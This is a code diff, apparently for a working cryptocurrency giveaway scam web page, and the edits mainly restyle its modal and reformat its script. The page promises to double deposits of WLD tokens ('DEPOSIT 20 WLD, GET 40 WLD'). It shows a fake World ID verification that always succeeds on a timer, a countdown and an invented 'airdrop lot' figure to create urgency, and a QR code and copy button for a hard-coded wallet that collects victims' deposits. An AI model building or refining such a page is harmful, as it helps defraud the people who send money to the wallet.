@@ -113,20 +113,29 @@ html,body{
   100%{opacity:0;transform:translateX(var(--to))}
 }
 
-/* ===== MODAL ===== */
-#modalBox{
-  display:none;
-  position:fixed;
-  top:50%;
-  left:50%;
-  transform:translate(-50%,-50%);
-  background:#fff;
-  padding:32px 40px;
-  border-radius:16px;
-  box-shadow:0 20px 50px rgba(0,0,0,.25);
-  z-index:99;
-  font-size:22px;
-  font-weight:800;
+/* ===== MODAL ESTÉTICO ===== */
+#modalBox {
+  display: none;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%) scale(0.95);
+  background: linear-gradient(145deg, #ffffff, #f1f1f1);
+  padding: 30px 40px;
+  border-radius: 16px;
+  box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+  z-index: 99;
+  font-size: 22px;
+  font-weight: 700;
+  text-align: center;
+  color: #111;
+  opacity: 0;
+  transition: all 0.4s ease;
+}
+
+#modalBox.show {
+  opacity: 1;
+  transform: translate(-50%, -50%) scale(1);
 }
 
 /* ===== SCREEN 2 ===== */
@@ -232,140 +241,126 @@ html,body{
 
 <!-- SCREEN 2 -->
 <div class="screen" id="screen2" style="display: none;">
-
-  <!-- LOGO GIRATORIO arriba -->
   <img src="logowld.png" class="logo">
-
-  <!-- TEXTO ESTÁTICO -->
   <div class="static-text">AIRDROP END</div>
-
-  <!-- CONTADOR HH:MM:SS -->
   <div id="dateCountdown"></div>
-
-  <!-- QR CENTRADO -->
   <div class="qr-box">
     <canvas id="qrCanvas" width="160" height="160"></canvas>
   </div>
-
-  <!-- COPY -->
   <div class="deposit-code">
     <input id="addr" readonly>
     <button id="copyBtn">COPY ADDRESS</button>
   </div>
-
-  <!-- AIRDROP LOT -->
   <div id="airdropLot">
     AIRDROP LOT: <span id="lotValue">0</span>
   </div>
-
 </div>
 
 <script>
-
-/* ===== SCREEN 1 TEXTOS ===== */
-const TEXTS1=[
+/* ===== TEXTOS SCREEN 1 ===== */
+const TEXTS1 = [
   "100% EARN AIRDROP","DEPOSIT 20 WLD","GET 40 WLD",
   "100% 获得空投","存入 20 WLD","获得 40 WLD"
 ];
 
-const lines=[l1,l2,l3];
-let idx1=0;
+const lines = [l1, l2, l3];
+let idx1 = 0;
 
-async function type1(el,text){
-  el.innerHTML="";
+async function type1(el, text){
+  el.innerHTML = "";
   for(const c of text){
-    const s=document.createElement("span");
-    s.className="char";
-    s.innerHTML=c===" "?"&nbsp;":c;
+    const s = document.createElement("span");
+    s.className = "char";
+    s.innerHTML = c === " " ? "&nbsp;" : c;
     el.appendChild(s);
     s.classList.add("visible");
-    await new Promise(r=>setTimeout(r,40));
+    await new Promise(r => setTimeout(r, 40));
   }
 }
 
 async function loop1(){
-  for(let i=0;i<3;i++) await type1(lines[i],TEXTS1[(idx1+i)%TEXTS1.length]);
-  idx1=(idx1+3)%TEXTS1.length;
-  setTimeout(()=>lines.forEach(l=>l.innerHTML=""),3000);
+  for(let i = 0; i < 3; i++) await type1(lines[i], TEXTS1[(idx1+i)%TEXTS1.length]);
+  idx1 = (idx1 + 3) % TEXTS1.length;
+  setTimeout(() => lines.forEach(l => l.innerHTML = ""), 3000);
 }
+loop1(); setInterval(loop1, 7000);
 
-loop1(); setInterval(loop1,7000);
-
-/* ===== FONDO ===== */
+/* ===== FONDO FLOAT ===== */
 function spawnBg(){
-  const t=document.createElement("div");
-  t.className="bg-text";
-  t.textContent=TEXTS1[Math.random()*TEXTS1.length|0];
-  t.style.fontSize=(Math.random()*36+42)+"px";
-  t.style.top=Math.random()*85+"%";
-  const d=Math.random()>.5;
-  t.style.setProperty("--from",d?"-120%":"120%");
-  t.style.setProperty("--to",d?"120%":"-120%");
-  t.style.setProperty("--op",(Math.random()*.15+.2).toFixed(2));
-  t.style.animationDuration=(Math.random()*20+28)+"s";
+  const t = document.createElement("div");
+  t.className = "bg-text";
+  t.textContent = TEXTS1[Math.random()*TEXTS1.length | 0];
+  t.style.fontSize = (Math.random()*36 + 42) + "px";
+  t.style.top = Math.random()*85 + "%";
+  const d = Math.random() > .5;
+  t.style.setProperty("--from", d ? "-120%" : "120%");
+  t.style.setProperty("--to", d ? "120%" : "-120%");
+  t.style.setProperty("--op", (Math.random()*0.15 + 0.2).toFixed(2));
+  t.style.animationDuration = (Math.random()*20 + 28) + "s";
   bgLayer.appendChild(t);
-  setTimeout(()=>t.remove(),50000);
+  setTimeout(() => t.remove(), 50000);
 }
-setInterval(spawnBg,2600);
+setInterval(spawnBg, 2600);
 
-/* ===== VERIFY ===== */
-verifyBtn.onclick=()=>{
-  modalBox.style.display="block";
-  modalText.style.color="#000";
-  modalText.innerText="VERIFICANDO...";
-  setTimeout(()=>{
-    modalText.style.color="green";
-    modalText.innerText="WORLD ID VERIFICADO";
-    setTimeout(()=>{
-      modalBox.style.display="none";
-      screen1.style.display="none";
-      screen2.style.display="flex";
+/* ===== VERIFY FLOW ===== */
+verifyBtn.onclick = () => {
+  modalBox.style.display = "block";
+  setTimeout(() => modalBox.classList.add("show"), 10);
+  modalText.style.color = "#000";
+  modalText.innerText = "VERIFICANDO...";
+
+  setTimeout(() => {
+    modalText.style.color = "green";
+    modalText.innerText = "WORLD ID VERIFICADO";
+    setTimeout(() => {
+      modalBox.classList.remove("show");
+      setTimeout(() => modalBox.style.display = "none", 400);
+      screen1.style.display = "none";
+      screen2.style.display = "flex";
       startTimer();
       startQR();
-    },2000);
-  },4000);
+    }, 2000);
+  }, 4000);
 };
 
-/* ===== CONTADOR ===== */
-const dateEl=document.getElementById("dateCountdown");
-const lotEl=document.getElementById("lotValue");
+/* ===== CONTADOR Y LOT ===== */
+const dateEl = document.getElementById("dateCountdown");
+const lotEl = document.getElementById("lotValue");
 
 function startTimer(){
-  setInterval(()=>{
-    const now=new Date();
-    const diff=new Date("2026-01-11T00:00:00")-now;
-    const h=Math.floor(diff/36e5)%24;
-    const m=Math.floor(diff/6e4)%60;
-    const s=Math.floor(diff/1e3)%60;
-    dateEl.innerText=`${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
-  },1000);
+  setInterval(() => {
+    const now = new Date();
+    const diff = new Date("2026-01-11T00:00:00") - now;
+    const h = Math.floor(diff/36e5)%24;
+    const m = Math.floor(diff/6e4)%60;
+    const s = Math.floor(diff/1e3)%60;
+    dateEl.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+  }, 1000);
 
-  /* ===== AIRDROP LOT estático ===== */
-  const startYear=new Date(new Date().getFullYear(),0,1);
-  const secondsSince=Math.floor((Date.now()-startYear.getTime())/1000);
-  lotEl.innerText=secondsSince.toLocaleString();
+  const startYear = new Date(new Date().getFullYear(), 0, 1);
+  const secondsSince = Math.floor((Date.now() - startYear.getTime()) / 1000);
+  lotEl.innerText = secondsSince.toLocaleString();
 }
 
 /* ===== QR ===== */
-const WALLETS=[
+const WALLETS = [
   "0xf8af1505beb8a37207eb1f019ded31dd08fc571c",
   "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
 ];
-let wi=0;
-const qr=new QRious({element:qrCanvas,size:160,value:WALLETS[0]});
-addr.value=WALLETS[0];
+let wi = 0;
+const qr = new QRious({element: qrCanvas, size: 160, value: WALLETS[0]});
+addr.value = WALLETS[0];
 
 function startQR(){
-  setInterval(()=>{
-    wi=(wi+1)%WALLETS.length;
-    qr.set({value:WALLETS[wi]});
-    addr.value=WALLETS[wi];
-  },20000);
+  setInterval(() => {
+    wi = (wi + 1) % WALLETS.length;
+    qr.set({value: WALLETS[wi]});
+    addr.value = WALLETS[wi];
+  }, 20000);
 }
 
 /* ===== COPY ===== */
-copyBtn.onclick=()=>navigator.clipboard.writeText(addr.value);
-
+copyBtn.onclick = () => navigator.clipboard.writeText(addr.value);
 </script>
 
 </body>
